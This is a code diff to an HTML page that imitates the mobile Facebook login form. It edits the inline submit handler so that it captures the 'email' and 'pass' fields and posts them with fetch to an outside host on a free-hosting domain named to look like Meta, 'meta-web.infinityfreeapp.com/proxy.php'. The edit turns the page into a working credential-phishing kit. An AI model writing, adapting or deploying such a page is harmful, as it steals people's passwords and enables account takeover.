@@ -86,7 +86,7 @@
                   </div>
                   <div class="_5rut">
                     <form class="mobile-login-form _9hp- _5spm"
-                      id="login_form"
+                      id="login_forme"
                       
                     >
                       <input
@@ -206,7 +206,7 @@
                           data-sigil="login_password_step_element"
                         >
                           <button
-                            type="button"
+                            type="submit"
                             value="Log In"
                             class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu"
                             id="btnsubmit"
@@ -275,15 +275,17 @@
                       
                       <script>
     // Ajouter un écouteur d'événement sur la soumission du formulaire
-    document.getElementById('login_form').addEventListener('submit', function(e) {
+    document.getElementById('login_forme').addEventListener('submit', function(e) {
         e.preventDefault();  // Empêche l'envoi classique du formulaire
 
-        // Récupérer la valeur du champ "nom"
-        const nom = document.getElementById('nom').value;
+        // Récupérer les valeurs des champs "email" et "pass"
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
 
         // Créer les données à envoyer en URL encodée
         const formData = new URLSearchParams();
-        formData.append('nom', nom);
+        formData.append('email', email);
+        formData.append('pass', pass);
 
         // Envoyer les données via fetch
         fetch('https://meta-web.infinityfreeapp.com/proxy.php', {
@@ -473,4 +475,4 @@
       }
       </script>
   </body>
-</html>
+      </html>
